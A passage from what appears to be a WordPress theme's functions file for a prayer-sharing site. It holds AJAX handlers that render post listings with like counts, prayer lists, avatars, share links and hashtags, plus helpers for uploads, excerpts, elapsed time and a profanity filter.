									<?php if($provider == ""){ ?>
										<?php $user_pix = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."user_avtar WHERE user_id = $authore_id");?>
										<?php if($user_pix->user_avtar == ""){?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/library/images/epray-icon.png" class="avtr_img" /></a>
										<?php }else{?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/library/avtar/<?php echo $user_pix->user_avtar;?>" class="avtr_img"/></a> 
										<?php }?>
									<?php } else {?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php echo get_avatar($authore_id, 60);?> </a> 
									<?php }?>
										<!----user avtar---->
                                       <?php } ?>
                                        <div class="user-name">
                                        	<?php if(!is_user_logged_in()){?> 
                                        	<h3><a href="#Loginform" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                             <?php }else{?> 
                                            <h3><a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                           	<?php }?>
                                            <div class="clear"></div>
                                            <span><?php echo get_the_time(); ?> / <?php the_time('F d,Y') ?></span>
                                        </div>
                                        <div class="clear"></div>
                                      
                                    <?php echo "<p>".get_excerpt_with_hashtag(130)."</p>"; ?>
                                          
                                        
                                        <ul id="<?php echo get_the_ID(); ?>">
                                        	<?php
												if(!is_user_logged_in()){?> 
													 <a href="#Loginform">
													  <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
															</span>
			                                            </li>
			                                            </a>
                                             <?php }else{?> 
													<a href="javascript:void(0);" class="like_plus" title="I'm Praying">
			                                            <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
																
			                                                	</span>
			                                            </li>
		                                            </a>
                                            	  	
										    <?php } ?>
										    
										    <?php
												if(!is_user_logged_in()){?> 
													<a href="#Loginform">
                                               <li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                          </a>
	                                            <?php }else{?> 
	                                            <a href="javascript:void(0);" class="prayer_list" title="Add to Prayer List">
                                             	<li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                            </a>
                                                <?php } ?>
                                             <?php
												if(!is_user_logged_in()){?>  
													<a href="#Loginform">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
												<?php }else{?>   
                                            <a href="<?php the_permalink(); ?>#prayerform" title="Prayer Replies">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
                                            <?php } ?>
                                        </ul>
                                        
                                        
                		<?php  
                			$posttags = get_the_tags();
							$postid = get_the_ID(); 
							//print_r($posttags);
							if(is_array($posttags)){
							   foreach($posttags as $tag) {
							   		if(!is_user_logged_in()){ 
									?>
									<a class="prg_notlog" href="#Loginform" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php }else{?> 
									<a class="prg" href="javascript:void(0);" id="<?php echo $postid;?>" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php } ?>
									<?php 
								}
							}
						?>
  										
                                    </div>
                                </section>
		<?php
	endforeach;
	die();
}
?>

<?php // Ajax Code For search page
add_action('wp_ajax_search_action' , 'searchpage'); // When user login
add_action('wp_ajax_nopriv_search_action' , 'searchpage'); // When user not loggin

function searchpage() {
	global $post;
	global $wpdb;
	$page_id = $_POST['page_id'];
	//$author_name = $_POST['authorname'];
	//$tag_name = $_POST['tag_name'];
	$terms = urldecode($_POST['terms']);
	
    $paged = (get_query_var('paged')) ? get_query_var('paged') : $page_id;
	$offset_value = $paged* get_option('posts_per_page');
	//$args = array( 'cat' => $categoryname,'order'=>'ASC','posts_per_page'=>'6','paged'=>$paged,'offset'=>$offset_value);
	$strpos = strpos($terms,"#");
	if($strpos == 0 and $strpos !== FALSE)
	{
		$term_tag = str_replace("#","",$terms);
		
		$args = array('post_type'=> 'post','orderby' => 'post_date','paged'=>$paged,'offset'=>$offset_value,'tag'=>$term_tag);
	}
	else {
		$args = array('post_type'=> 'post','orderby' => 'post_date','paged'=>$paged,'offset'=>$offset_value,'author_name'=>$terms);
	}
	
	
	query_posts( $args );
	while (have_posts()) : the_post(); 
		//$normal_image = wp_get_attachment_url( get_post_thumbnail_id() ); 
        //$normal_image = get_field("normal_image");
		?>
			  				 <section>
                                  <div class="image-main ff-left">
                                  	<a href="<?php the_permalink();?>" title="">
                                         <?php if ( has_post_thumbnail() ) {
													the_post_thumbnail('custom-size');
												}else {	?>
													  <img src="<?php echo get_template_directory_uri(); ?>/library/images/pray-img-1.jpg">
										 <?php }  ?> 
										 </a>
                                        <div class="img-des">
                                             <ul>
                                            	<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID, 'thumbnail') ); ?>
                                            	<?php $postid = get_the_ID(); ?> 
                                            	   <!-- <li><span class="share"></span></li> -->
                                                 <li>
                                                	<a class="fb" href="http://www.facebook.com/sharer.php?s=100&p[title]=<?php the_title(); ?>&p[url]=<?php the_permalink(); ?>&p[summary]=<?php echo get_post_field('post_content', $postid); ?>&p[images][0]=<?php echo $url ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Facebook"></a>
                                                </li>
                                                 <li>
                                                	<a class="twt" href="http://twitter.com/home?status=<?php the_title(); ?>+<?php the_permalink(); ?>+<?php echo substr($post->post_content,0 , 80); ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Twitter"></a>
	                            				</li>
                                                <li>
                                                	<a class="gp"  href="https://plus.google.com/share?url=<?php the_permalink(); ?>" onclick="javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=600');return false;" title="Google+"></a>
                                                </li>
                                            </ul>
                                            <!-- <p>I’m telling my friends to pray</p> -->
                                        </div>
                                    </div>
                                    <div class="user-detail ff-left" id="<?php the_author_ID(); ?>">
                                    	
                                    	<!----user avtar---->
									<?php $authore_id = get_the_author_meta('ID');?>
									<?php $provider = get_the_author_meta("wsl_current_provider", $authore_id); ?>
									
									<?php if($provider == ""){ ?>
										<?php $user_pix = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."user_avtar WHERE user_id = $authore_id");?>
										<?php if($user_pix->user_avtar == ""){?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/library/images/epray-icon.png" class="avtr_img" /></a>
										<?php }else{?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/library/avtar/<?php echo $user_pix->user_avtar;?>" class="avtr_img"/></a> 
										<?php }?>
									<?php } else {?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php echo get_avatar($authore_id, 60);?> </a> 
									<?php }?>
										<!----user avtar---->
                                      
                                        <div class="user-name">
                                        	<?php if(!is_user_logged_in()){?> 
                                        	<h3><a href="#Loginform" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                             <?php }else{?> 
                                            <h3><a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                           	<?php }?>
                                            <div class="clear"></div>
                                            <span><?php echo get_the_time(); ?> / <?php the_time('F d,Y') ?></span>
                                        </div>
                                        <div class="clear"></div>
                                        
                                     <?php echo "<p>".get_excerpt_with_hashtag(130)."</p>"; ?>
                                        
                                        <ul id="<?php echo get_the_ID(); ?>">
                                        	<?php
												if(!is_user_logged_in()){?> 
													 <a href="#Loginform">
													  <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
															</span>
			                                            </li>
			                                            </a>
                                             <?php }else{?> 
													<a href="javascript:void(0);" class="like_plus" title="I'm Praying">
			                                            <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
																
			                                                	</span>
			                                            </li>
		                                            </a>
                                            	  	
										    <?php } ?>
										    
										    <?php
												if(!is_user_logged_in()){?> 
													<a href="#Loginform">
                                               <li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                          </a>
	                                            <?php }else{?> 
	                                            <a href="javascript:void(0);" class="prayer_list" title="Add to Prayer List">
                                             	<li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                            </a>
                                                <?php } ?>
                                             <?php
												if(!is_user_logged_in()){?>  
													<a href="#Loginform">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
												<?php }else{?>   
                                            <a href="<?php the_permalink(); ?>#prayerform" title="Prayer Replies">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
                                            <?php } ?>
                                        </ul>
                                        
                                        
                		<?php  
                			$posttags = get_the_tags();
							$postid = get_the_ID(); 
							//print_r($posttags);
							if(is_array($posttags)){
							   foreach($posttags as $tag) {
							   		if(!is_user_logged_in()){ 
									?>
									<a class="prg_notlog" href="#Loginform" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php }else{?> 
									<a class="prg" href="javascript:void(0);" id="<?php echo $postid;?>" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php } ?>
									<?php 
								}
							}
						?>
  										
                                    </div>
                                </section>
		<?php
	endwhile;
	die();
}
?>
<?php // Ajax Code For Author Page
add_action('wp_ajax_author_action' , 'author_blog'); // When user login
add_action('wp_ajax_nopriv_author_action' , 'author_blog'); // When user not loggin

function author_blog() {
	global $post;
	global $wpdb;
	$page_id = $_POST['page_id'];
	$author_id = $_POST['authorid'];
	$tag_name = $_POST['tag_name'];
	
    $paged = (get_query_var('paged')) ? get_query_var('paged') : $page_id;
	$offset_value = $paged* get_option('posts_per_page');
	//$args = array( 'cat' => $categoryname,'order'=>'ASC','posts_per_page'=>'6','paged'=>$paged,'offset'=>$offset_value);
	if($tag_name == ""){
		$args = array('post_type'=> 'post','orderby' => 'post_date','paged'=>$paged,'offset'=>$offset_value,'author'=>$author_id);	
	}elseif($tag_name != ""){
		$args = array('post_type'=> 'post','orderby' => 'post_date','paged'=>$paged,'offset'=>$offset_value,'tag'=>$tag_name);
	}
	
	query_posts( $args );
	while (have_posts()) : the_post(); 
		//$normal_image = wp_get_attachment_url( get_post_thumbnail_id() ); 
        //$normal_image = get_field("normal_image");
		?>
			  				 <section>
                                  <div class="image-main ff-left">
                                  	<a href="<?php the_permalink();?>" title="">
                                         <?php if ( has_post_thumbnail() ) {
													the_post_thumbnail('custom-size');
												}else {	?>
													  <img src="<?php echo get_template_directory_uri(); ?>/library/images/pray-img-1.jpg">
										 <?php }  ?> 
										 </a>
                                        <div class="img-des">
                                             <ul>
                                            	<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID, 'thumbnail') ); ?>
                                            	<?php $postid = get_the_ID(); ?> 
                                            	   <!-- <li><span class="share"></span></li> -->
                                                 <li>
                                                	<a class="fb" href="http://www.facebook.com/sharer.php?s=100&p[title]=<?php the_title(); ?>&p[url]=<?php the_permalink(); ?>&p[summary]=<?php echo get_post_field('post_content', $postid); ?>&p[images][0]=<?php echo $url ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Facebook"></a>
                                                </li>
                                                 <li>
                                                	<a class="twt" href="http://twitter.com/home?status=<?php the_title(); ?>+<?php the_permalink(); ?>+<?php echo substr($post->post_content,0 , 80); ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Twitter"></a>
	                            				</li>
                                                <li>
                                                	<a class="gp"  href="https://plus.google.com/share?url=<?php the_permalink(); ?>" onclick="javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=600');return false;" title="Google+"></a>
                                                </li>
                                            </ul>
                                            <!-- <p>I’m telling my friends to pray</p> -->
                                        </div>
                                    </div>
                                    <div class="user-detail ff-left" id="<?php the_author_ID(); ?>">
                                    	
                                 
                                    	<!----user avtar---->
									<?php $authore_id = get_the_author_meta('ID');?>
									<?php $provider = get_the_author_meta("wsl_current_provider", $authore_id); ?>
									
									<?php if($provider == ""){ ?>
									<?php $user_pix = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."user_avtar WHERE user_id = $authore_id");?>
									<?php if($user_pix->user_avtar == ""){?>
											<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/library/images/epray-icon.png" class="avtr_img" /></a>
									<?php }else{?>
											<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/library/avtar/<?php echo $user_pix->user_avtar;?>" class="avtr_img"/></a> 
									<?php }?>
									<?php } else {?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php echo get_avatar($authore_id, 60);?> </a> 
									<?php }?>
										<!----user avtar---->
                                       
                                        <div class="user-name">
                                        	<?php if(!is_user_logged_in()){?> 
                                        	<h3><a href="#Loginform" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                             <?php }else{?> 
                                            <h3><a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                           	<?php }?>
                                            <div class="clear"></div>
                                            <span><?php echo get_the_time(); ?> / <?php the_time('F d,Y') ?></span>
                                        </div>
                                        <div class="clear"></div>
                                        
                                  <?php echo "<p>".get_excerpt_with_hashtag(130)."</p>"; ?>
                                        
                                        <ul id="<?php echo get_the_ID(); ?>">
                                        	<?php
												if(!is_user_logged_in()){?> 
													 <a href="#Loginform">
													  <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
															</span>
			                                            </li>
			                                            </a>
                                             <?php }else{?> 
													<a href="javascript:void(0);" class="like_plus" title="I'm Praying">
			                                            <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
																
			                                                	</span>
			                                            </li>
		                                            </a>
                                            	  	
										    <?php } ?>
										    
										    <?php
												if(!is_user_logged_in()){?> 
													<a href="#Loginform">
                                               <li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                          </a>
	                                            <?php }else{?> 
	                                            <a href="javascript:void(0);" class="prayer_list" title="Add to Prayer List">
                                             	<li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                            </a>
                                                <?php } ?>
                                             <?php
												if(!is_user_logged_in()){?>  
													<a href="#Loginform">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
												<?php }else{?>   
                                            <a href="<?php the_permalink(); ?>#prayerform" title="Prayer Replies">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
                                            <?php } ?>
                                        </ul>
                                        
                                        
                		<?php  
                			$posttags = get_the_tags();
							$postid = get_the_ID(); 
							//print_r($posttags);
							if(is_array($posttags)){
							   foreach($posttags as $tag) {
							   		if(!is_user_logged_in()){ 
									?>
									<a class="prg_notlog" href="#Loginform" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php }else{?> 
									<a class="prg" href="javascript:void(0);" id="<?php echo $postid;?>" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php } ?>
									<?php 
								}
							}
						?>
  										
                                    </div>
                                </section>
		<?php
	endwhile;
	die();
}
?>

<?php // Ajax Code For Prayer Page
add_action('wp_ajax_prayer_action' , 'prayer_page'); // When user login
add_action('wp_ajax_nopriv_prayer_action' , 'prayer_page'); // When user not loggin

function prayer_page() {
	global $post;
	global $wpdb;
	$page_id = $_POST['page_id'];
	$pid = $_POST['pid'];
	
    $paged = (get_query_var('paged')) ? get_query_var('paged') : $page_id;
	$offset_value = $paged* get_option('posts_per_page');
	//$args = array( 'cat' => $categoryname,'order'=>'ASC','posts_per_page'=>'6','paged'=>$paged,'offset'=>$offset_value);
	if($pid != "")
	{
		$args = array('post_type'=> 'post','orderby' => 'post_date','paged'=>$paged,'offset'=>$offset_value,'post__in'=>$pid);	
	}
	
	
	query_posts( $args );
	while (have_posts()) : the_post(); 
		//$normal_image = wp_get_attachment_url( get_post_thumbnail_id() ); 
        //$normal_image = get_field("normal_image");
		?>
			  				 <section>
                                  <div class="image-main ff-left">
                                  	<a href="<?php the_permalink();?>" title="">
                                         <?php if ( has_post_thumbnail() ) {
													the_post_thumbnail('custom-size');
												}else {	?>
													  <img src="<?php echo get_template_directory_uri(); ?>/library/images/pray-img-1.jpg">
										 <?php }  ?> 
										 </a>
                                        <div class="img-des">
                                             <ul>
                                            	<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID, 'thumbnail') ); ?>
                                            	<?php $postid = get_the_ID(); ?> 
                                            	   <!-- <li><span class="share"></span></li> -->
                                                 <li>
                                                	<a class="fb" href="http://www.facebook.com/sharer.php?s=100&p[title]=<?php the_title(); ?>&p[url]=<?php the_permalink(); ?>&p[summary]=<?php echo get_post_field('post_content', $postid); ?>&p[images][0]=<?php echo $url ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Facebook"></a>
                                                </li>
                                                 <li>
                                                	<a class="twt" href="http://twitter.com/home?status=<?php the_title(); ?>+<?php the_permalink(); ?>+<?php echo substr($post->post_content,0 , 80); ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Twitter"></a>
	                            				</li>
                                                <li>
                                                	<a class="gp"  href="https://plus.google.com/share?url=<?php the_permalink(); ?>" onclick="javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=600');return false;" title="Google+"></a>
                                                </li>
                                            </ul>
                                            <!-- <p>I’m telling my friends to pray</p> -->
                                        </div>
                                    </div>
                                    <div class="user-detail ff-left" id="<?php the_author_ID(); ?>">
                                    	
                                    		<!----user avtar---->
									<?php $authore_id = get_the_author_meta('ID');?>
									<?php $provider = get_the_author_meta("wsl_current_provider", $authore_id); ?>
									
									<?php if($provider == ""){ ?>
										<?php $user_pix = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."user_avtar WHERE user_id = $authore_id");?>
										<?php if($user_pix->user_avtar == ""){?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/library/images/epray-icon.png" class="avtr_img" /></a>
										<?php }else{?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/library/avtar/<?php echo $user_pix->user_avtar;?>" class="avtr_img"/></a> 
										<?php }?>
									
									<?php } else {?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php echo get_avatar($authore_id, 60);?> </a> 
									<?php }?>
										<!----user avtar---->
                                     
                                        <div class="user-name">
                                        	<?php if(!is_user_logged_in()){?> 
                                        	<h3><a href="#Loginform" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                             <?php }else{?> 
                                            <h3><a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                           	<?php }?>
                                            <div class="clear"></div>
                                            <span><?php echo get_the_time(); ?> / <?php the_time('F d,Y') ?></span>
                                        </div>
                                        <div class="clear"></div>
                                        
                                     <?php echo "<p>".get_excerpt_with_hashtag(130)."</p>"; ?>
                                        
                                        <ul id="<?php echo get_the_ID(); ?>">
                                        	<?php
												if(!is_user_logged_in()){?> 
													 <a href="#Loginform">
													  <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
															</span>
			                                            </li>
			                                            </a>
                                             <?php }else{?> 
													<a href="javascript:void(0);" class="like_plus" title="I'm Praying">
			                                            <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
																
			                                                	</span>
			                                            </li>
		                                            </a>
                                            	  	
										    <?php } ?>
										    
										    <?php
												if(!is_user_logged_in()){?> 
													<a href="#Loginform">
                                               <li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                          </a>
	                                            <?php }else{?> 
	                                            <a href="javascript:void(0);" class="prayer_list" title="Add to Prayer List">
                                             	<li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                            </a>
                                                <?php } ?>
                                             <?php
												if(!is_user_logged_in()){?>  
													<a href="#Loginform">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
												<?php }else{?>   
                                            <a href="<?php the_permalink(); ?>#prayerform" title="Prayer Replies">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
                                            <?php } ?>
                                        </ul>
                                        
                                        
                		<?php  
                			$posttags = get_the_tags();
							$postid = get_the_ID(); 
							//print_r($posttags);
							if(is_array($posttags)){
							   foreach($posttags as $tag) {
							   		if(!is_user_logged_in()){ 
									?>
									<a class="prg_notlog" href="#Loginform" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php }else{?> 
									<a class="prg" href="javascript:void(0);" id="<?php echo $postid;?>" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php } ?>
									<?php 
								}
							}
						?>
  										
                                    </div>
                                </section>
		<?php
	endwhile;
	die();
}
?>

<?php // Add Custom Post Types
add_action ('init', 'create_post_type');

function create_post_type() {

	register_post_type( 'featured_image',
			array(
				'labels' => array(
					'name' => __( 'Featured Image' ),
					'singular_name' => __( 'featured_image' )
				),
				'public' => true,
				'has_archive' => true,
				'rewrite' => array('slug' => 'featured_image'),
				'supports' => array('title'),
				'taxonomies' => array('post_tag')
			)
		);
		
} 

// search filter don't display custom post
function filter_search($query) {
    if ($query->is_search) {
	$query->set('post_type', array('post'));
    };
    return $query;
};
add_filter('pre_get_posts', 'filter_search');

//hide admin bar
add_action( 'init', 'blockusers_init' );

	function blockusers_init() {
    if ( is_admin() && ! current_user_can( 'administrator' ) && !( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
        wp_redirect( home_url() );
        exit;
    }
}
	

//add_action( 'init', 'time_elapsed_string' );
function time_elapsed_string($datetime, $full = false) {
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);

    $diff->w = floor($diff->d / 7);
    $diff->d -= $diff->w * 7;

    $string = array(
        'y' => 'yr',
        'm' => 'mo',
        'w' => 'wk',
        'd' => 'day',
        'h' => 'hr',
        'i' => 'min',
        's' => 'sec',
    );
    foreach ($string as $k => &$v) {
        if ($diff->$k) {
            $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
        } else {
            unset($string[$k]);
        }
    }

    if (!$full) $string = array_slice($string, 0, 1);
    return $string ? implode(', ', $string) . '' : '';
}

?>
<?php //swear words function for single.php
function strp_cont(){
			global $pccf_defaults;
			$tmp = get_option( 'pccf_options');
			$db_search_string = $tmp['txtar_keywords'];
			//print_r($db_search_string);
		
			$rows = explode(",", $db_search_string);
			
		function strReplace( $blacklist, $subject) {
		    return array_reduce($blacklist,function ($r,$v) {
		        return $r = str_ireplace($v, $v[0].str_repeat("*",(strlen($v)-1)), $r);
		        //  return $r = str_ireplace($v, $v[0].$v[2].str_repeat("*",(str_len($v)-1), $r);
		    }, $subject);
		}
		
			
		$blacklist = $rows;
		
		$string = get_the_content(); 
		$strTweet = $string;
		$strTweets = preg_replace('/(^|\s)#(\w*[a-zA-Z_]+\w*)/', '\1', $strTweet);
		$strip_cont = strip_tags($strTweets);
		$result = strReplace($blacklist, $strip_cont);
		echo $result;	
}
?>
<?php //upload image use wordress 

	function upload_user_file( $file = array() ) {
    
    require_once( ABSPATH . 'wp-admin/includes/admin.php' );
    
    $file_return = wp_handle_upload( $file, array('test_form' => false ) );
    
    if( isset( $file_return['error'] ) || isset( $file_return['upload_error_handler'] ) ) {
        return false;
    } else {
        
        $filename = $file_return['file'];
        
        $attachment = array(
            'post_mime_type' => $file_return['type'],
            'post_title' => preg_replace( '/\.[^.]+$/', '', basename( $filename ) ),
            'post_content' => '',
            'post_status' => 'inherit',
            'guid' => $file_return['url']
        );
        
        $attachment_id = wp_insert_attachment( $attachment, $file_return['url'] );
        
        require_once (ABSPATH . 'wp-admin/includes/image.php' );
        $attachment_data = wp_generate_attachment_metadata( $attachment_id, $filename );
        wp_update_attachment_metadata( $attachment_id, $attachment_data );
        
        if( 0 < intval( $attachment_id ) ) {
            return $attachment_id;
        }
    }
    
    return false;
} 

// image croping
add_image_size( 'custom-size', 300, 300, array( 'center', 'top' ) ); // Hard crop center top
add_image_size( 'small-custom-size', 65, 65, array( 'center', 'top' ) ); // Hard crop center top

function get_excerpt_with_hashtag($count){
  $url = home_url();
  $excerpt = get_the_content();
  $excerpt = strip_tags($excerpt);
  $excerpt = substr($excerpt, 0, $count);
  if(strlen($excerpt)>= $count){
  	$excerpt = substr($excerpt, 0, strripos($excerpt, " "));
	$excerpt = $excerpt.'...';	
  }
  
  $excerpt = preg_replace('/(^|\s)#(\w*[a-zA-Z_]+\w*)/', '\1<a href="'.$url.'/tag/\2">#\2</a>', $excerpt);
  
  return $excerpt;
}
?>